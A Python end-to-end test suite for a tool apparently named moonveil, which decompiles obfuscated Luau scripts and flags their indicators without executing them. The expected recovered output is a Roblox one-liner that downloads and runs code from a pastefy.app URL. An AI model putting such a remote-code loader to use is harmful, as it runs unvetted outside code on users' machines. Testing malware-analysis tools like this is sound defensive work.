import contextlib
import io
import json
import shutil
import tempfile
from pathlib import Path
from unittest import mock

from moonveil import cli
from moonveil.errors import MoonVeilError
from harness import LuauCase
from helpers import FIXTURE

RECOVERED = 'loadstring(game:HttpGet("https://pastefy.app/DBk446XH/raw"))()\n'


class EndToEndTests(LuauCase):
    def invoke(self, args):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = cli.main([str(a) for a in args])
        return code, out.getvalue(), err.getvalue()

    def workspace(self):
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        path = Path(directory.name) / 'input.lua'
        shutil.copy(FIXTURE, path)
        return Path(directory.name), path

    def test_default_output_name_and_status_summary(self):
        directory, source = self.workspace()
        code, stdout, _ = self.invoke(['decompile', source, '--require-compile'])
        self.assertEqual(code, 0)
        self.assertEqual((directory / 'input.recovered.luau').read_text().splitlines()[1:], RECOVERED.splitlines())
        self.assertIn('structured, compiled with official Luau', stdout)
        self.assertIn('remote-code-loader', stdout)
        self.assertIn('"https://pastefy.app/DBk446XH/raw"', stdout)
        self.assertIn('never contacts', stdout)

    def test_stdout_output_keeps_status_on_stderr(self):
        _, source = self.workspace()
        code, stdout, stderr = self.invoke(['decompile', source, '-o', '-'])
        self.assertEqual(code, 0)
        self.assertEqual(stdout.splitlines()[1:], RECOVERED.splitlines())
        self.assertIn('Recovered 11 instructions', stderr)
        code, stdout, _ = self.invoke(['dump', source, '-o', '-', '-q'])
        self.assertEqual(json.loads(stdout)['schema'], 'moonveil-2.1.0-graph-v1')

    def test_json_manifest_and_artifacts(self):
        directory, source = self.workspace()
        artifacts = directory / 'artifacts'
        code, stdout, _ = self.invoke(['decompile', source, '-o', directory / 'out.luau', '--artifacts', artifacts, '--json'])
        self.assertEqual(code, 0)
        manifest = json.loads(stdout)
        self.assertEqual(manifest, json.loads((artifacts / 'manifest.json').read_text()))
        self.assertEqual(manifest['emission'], 'structured')
        self.assertEqual(manifest['indicators']['urls'], ['https://pastefy.app/DBk446XH/raw'])
        self.assertEqual(manifest['indicators']['behaviors'][0]['id'], 'remote-code-loader')
        self.assertIs(manifest['protected_program_executed'], False)
        self.assertEqual(sorted(p.name for p in artifacts.iterdir()), ['decoded.json', 'instructions.txt', 'manifest.json', 'normalized.json'])
        code, _, stderr = self.invoke(['decompile', source, '-o', '-', '--json'])
        self.assertEqual(code, 2)
        self.assertIn('--json', stderr)

    def test_register_style_can_be_requested(self):
        directory, source = self.workspace()
        code, _, _ = self.invoke(['decompile', source, '-o', directory / 'r.luau', '--style', 'registers', '-q', '--artifacts', directory / 'a'])
        self.assertEqual(code, 0)
        self.assertIn('registers retain VM numbering', (directory / 'r.luau').read_text())
        self.assertEqual(json.loads((directory / 'a' / 'manifest.json').read_text())['emission'], 'registers')

    def test_compiler_rejection_falls_back_and_is_recorded(self):
        directory, source = self.workspace()
        real = cli.compile_source
        calls = []

        def flaky(text, *args, **kwargs):
            calls.append(text)
            if len(calls) == 1:
                raise MoonVeilError('luau-compile exited with code 1: synthetic')
            return real(text, *args, **kwargs)

        with mock.patch.object(cli, 'compile_source', flaky):
            code, stdout, _ = self.invoke(['decompile', source, '-o', directory / 'o.luau', '--artifacts', directory / 'a'])
        self.assertEqual(code, 0)
        self.assertIn('registers', stdout)
        manifest = json.loads((directory / 'a' / 'manifest.json').read_text())
        self.assertEqual(manifest['emission'], 'registers')
        self.assertTrue(any('rejected by luau-compile' in note for note in manifest['notes']))
        # An explicit style is never silently replaced.
        calls.clear()
        with mock.patch.object(cli, 'compile_source', flaky):
            code, _, stderr = self.invoke(['decompile', source, '-o', directory / 'p.luau', '--style', 'structured'])
        self.assertEqual(code, 2)
        self.assertIn('synthetic', stderr)

    def test_invalid_limits_are_rejected_by_the_parser(self):
        _, source = self.workspace()
        for flag, value in (('--memory-limit', '-5'), ('--memory-limit', 'lots'), ('--timeout', '0')):
            with self.subTest(flag=flag, value=value), contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit) as raised:
                cli.main(['decompile', str(source), flag, value])
            self.assertEqual(raised.exception.code, 2)

    def test_compiler_error_message_names_the_compiler(self):
        from moonveil.runtime import compile_source
        with self.assertRaisesRegex(MoonVeilError, 'luau-compile'):
            compile_source('local = =', self.luau, 10)

    def test_runtime_limits_apply_to_luau(self):
        from moonveil.runtime import run_bounded
        with tempfile.TemporaryDirectory() as directory:
            script = Path(directory) / 'hog.luau'
            script.write_text('local t = {} for i = 1, 1e9 do t[i] = string.rep("x", 1e6) .. i end')
            with self.assertRaises(MoonVeilError):
                run_bounded([str(self.luau), str(script)], cwd=Path(directory), timeout=20, memory_mb=256, label='luau')
